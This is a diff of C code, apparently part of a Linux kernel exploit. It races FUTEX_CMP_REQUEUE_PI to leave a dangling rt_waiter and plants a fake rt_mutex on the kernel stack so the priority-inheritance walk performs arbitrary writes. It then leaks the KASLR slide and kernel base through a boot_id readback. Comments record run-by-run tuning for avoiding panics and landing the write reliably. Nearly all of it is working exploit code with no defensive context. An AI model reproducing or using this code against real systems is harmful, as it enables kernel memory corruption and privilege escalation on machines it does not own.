+   * requeue caller, NOT the waiter task. The waiter task's own timeout
+   * path (handle_early_requeue_pi_wakeup) never touches pi_blocked_on.
+   * So the task returns to userspace with pi_blocked_on still pointing
+   * at the stack rt_waiter: the dangling state.
+   *
+   * The consumer fires one sched_setattr on the waiter TID: the nice
+   * change reaches rt_mutex_adjust_pi(waiter) -> rt_mutex_adjust_prio_
+   * chain step [7] rt_mutex_dequeue(lock = waiter->lock = the planted
+   * all-zero mirror), which runs rb_erase_cached on the stamped
+   * tree_entry — the W1/W2 gadget pair. The walk then re-enqueues the
+   * waiter into the mirror's tree and exits at step [9] (the mirror has
+   * no owner) after wake_up_process(waiter->task = init_task, a
+   * benign no-op on the always-running idle task). Planting the mirror
+   * as waiter->lock is what avoids step [11]'s
+   * rt_mutex_dequeue_pi(owner, prerequeue_top_waiter=NULL) NULL-deref:
+   * with any lock that HAS an owner (e.g. the stale real target lock
+   * the un-stamped waiter keeps), step [11] dereferences address 0x18
+   * and panics — the run-#10 crash signature, not an exit-overwrite
+   * race. */
   slide_stamp_prepare();
-  atomic_store(&slide_consume_go, 1);
-  for (int i = 0; i < STAMP_ROUNDS; i++) {
+  /* plant the waiter fields BEFORE releasing the consumer: rt_mutex_
+   * adjust_pi reads waiter->lock up front and the walk re-reads it at
+   * step [3]; if the first stamp had not landed yet, the walk would
+   * compare a stale real lock against the planted mirror and silently
+   * exit — the run-14 attempt-1 no-write signature. */
+  for (int i = 0; i < 64; i++) {
     slide_stamp_once();
   }
+  pr_info("slide stamp loop start rounds=%d\n", STAMP_ROUNDS);
+  atomic_store(&slide_consume_go, 1);
+  /* NO logging inside the loop: every pr_info is a write+fsync syscall
+   * whose driver frames plow through the stamped region [SP0-0x230,
+   * SP0-0x128) and leave garbage there until the next setsockopt
+   * re-plants it (run 15/16: the consumer's walk fired during a log
+   * window and consumed trashed fields). Between two stamps the region
+   * now holds ONLY the planted values. */
+  for (int i = 0; i < STAMP_ROUNDS; i++) {
+    if (atomic_load(&slide_stamp_hold)) {
+      slide_stamp_halt();
+      continue;
+    }
+    slide_stamp_once();
+  }
+  pr_info("slide stamp loop done\n");
+  atomic_store(&slide_consume_go, 0);
   atomic_store(&slide_route_done, 1);
   /* Park syscall-free so the stamped kernel stack frame survives until
    * the requeue-race cleanup erases it during the stamp window (the
    * k40-exploit design: the waiter stays parked inside/near the overlay
    * and the erase fires from the requeue path, NOT from process-exit
    * teardown — do_exit's deep frames overwrite the stamped region, which
-   * is the _exit flow the upstream *poc* uses for its crash demo only). */
+   * is the _exit flow the upstream *poc* uses for its crash demo only).
+   * pause() itself only enters frames above SP0-0x60, so the stamped
+   * region [SP0-0x230, SP0-0x128) survives the park. */
+  pr_info("slide waiter parking (stamp survives)\n");
   for (;;) {
     pause();
   }
@@ -572,35 +673,41 @@ uint64_t slide_read_stext(void) {
   pr_success("slide boot_id readback pid=%d q0=%016llx q1=%016llx\n",
              getpid(), (unsigned long long)leaked,
              (unsigned long long)leaked_hi);
-  /* The UUID dashes are print format, not content, so compare against the
-   * stock UUID captured before the gadget ran: a CHANGED readback proves
-   * the W1 write landed and we are reading kernel memory. */
+  /* The readback serves the READ_PAIR (see slide_stamp_build): q0 =
+   * the qword at random_table[3]'s tail field, q1 = the "boot_id"
+   * entry's procname pointer = link 0xffffff800a209a37 + slide. The
+   * derived slide both leaks the KASLR slide directly and
+   * cross-validates the prefetch oracle. */
   if (slide_stock_bootid_len > 0 &&
       strncmp(buf, slide_stock_bootid, (size_t)slide_stock_bootid_len) == 0) {
     pr_warning("slide boot_id unchanged — write did not land\n");
     return 0;
   }
-  if ((leaked >> 48) == 0xffff) {
-    uint64_t stext = leaked - SLIDE_NFULNL_LOGGER_OFF;
-    pr_success("slide boot_id-derived_stext pid=%d value=%016llx stext=%016llx\n",
-               getpid(), (unsigned long long)leaked,
-               (unsigned long long)stext);
+  if ((leaked_hi >> 48) == 0xffff) {
+    uint64_t slide = leaked_hi - SLIDE_BOOTID_STRING_IMAGE;
+    uint64_t stext = KIMAGE_TEXT_BASE + slide;
+    if ((slide & 0x1fffffULL) != 0) {
+      pr_warning("slide readback q1=%016llx not 2MB-aligned — suspect "
+                 "non-leak content\n",
+                 (unsigned long long)leaked_hi);
+      return 0;
+    }
+    pr_success("slide boot_id LEAK q0=%016llx q1=%016llx slide=%016llx "
+               "stext=%016llx\n",
+               (unsigned long long)leaked, (unsigned long long)leaked_hi,
+               (unsigned long long)slide, (unsigned long long)stext);
     return stext;
   }
-  if (leaked == 0 && leaked_hi == 0) {
-    pr_warning("slide write LANDED (readback all-zero); loggers[0][0] empty "
-               "at this slide\n");
-    return KIMAGE_TEXT_BASE + slide_slide;
-  }
-  pr_warning("slide readback is kernel memory but not a slid pointer "
-             "(slide nonzero?): q0=%016llx q1=%016llx\n",
-             (unsigned long long)leaked, (unsigned long long)leaked_hi);
+  pr_warning("slide readback changed but q1=%016llx is not a kernel "
+             "pointer — non-leak content\n",
+             (unsigned long long)leaked_hi);
   return 0;
 }
 /* Runs the requeue race in the CHILD process; the waiter thread stamps
- * the dangling rt_waiter and _exit(0)s the whole process, so the
- * exit-time pi-chain teardown erases the stamped waiter. The boot_id
- * readback happens in the parent afterwards. */
+ * the dangling rt_waiter, parks syscall-free, and the consumer's
+ * sched_setattr triggers the PI-adjust walk that erases the stamped
+ * waiter (the W1/W2 gadget pair). The boot_id readback happens in the
+ * parent after the 15s park window. */
 void slide_child_leak_stext(void) {
   pthread_t waiter;
   pthread_t owner;
@@ -616,8 +723,13 @@ void slide_child_leak_stext(void) {
 
   usleep(20000);
   errno = 0;
-  futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
-           &slide_f_pi_target, 0);
+  long rq_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
+                         &slide_f_pi_target, 0);
+  /* -EDEADLK = the requeue's start_proxy_lock hit the pi cycle and
+   * remove_waiter() cleared the wrong task's pi_blocked_on = the dangle
+   * formed; -EAGAIN/-EINVAL = the waiter's timeout won the race and
+   * nothing dangles; 0/1 = requeue succeeded (no cycle seen). */
+  pr_info("slide child requeue ret=%ld errno=%d\n", rq_ret, errno);
 
   /* Park until the waiter's stamp loop _exit()s the process (fallback
    * timeout so a failed race does not hang the attempt forever). */
@@ -690,17 +802,21 @@ int slide_leak_kernel_base(void) {
     return 1;
   }
   slide_slide = slide_oracle_find_slide();
-  if (slide_slide != ~0ULL) {
-    kaslr_base = KIMAGE_TEXT_BASE + slide_slide;
-    kaslr_slide = slide_slide;
-    pr_success("slide oracle set kaslr_base=%016llx slide=%016llx\n",
-               (unsigned long long)kaslr_base,
-               (unsigned long long)kaslr_slide);
+  if (slide_slide == ~0ULL) {
+    /* No verified slide: every planted VA would be garbage and the first
+     * erase walk would panic. Fail the stage cleanly instead. */
+    pr_error("slide: oracle failed, refusing to run the race blind\n");
+    return 0;
   }
+  kaslr_base = KIMAGE_TEXT_BASE + slide_slide;
+  kaslr_slide = slide_slide;
+  pr_success("slide oracle set kaslr_base=%016llx slide=%016llx\n",
+             (unsigned long long)kaslr_base,
+             (unsigned long long)kaslr_slide);
 #ifdef CFGOPS_4_19_STYLE
   pr_warning("slide: bootid rb-gadget values derived for 4.19 "
-             "(LOGGERS_0_1=%016llx RANDOM_BOOT_ID_DATA=%016llx)\n",
-             (unsigned long long)(SLIDE_LOGGERS_0_1_IMAGE + slide_slide),
+             "(READ_PAIR=%016llx RANDOM_BOOT_ID_DATA=%016llx)\n",
+             (unsigned long long)(SLIDE_READ_PAIR_IMAGE + slide_slide),
              (unsigned long long)(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE + slide_slide));
 #endif
   for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
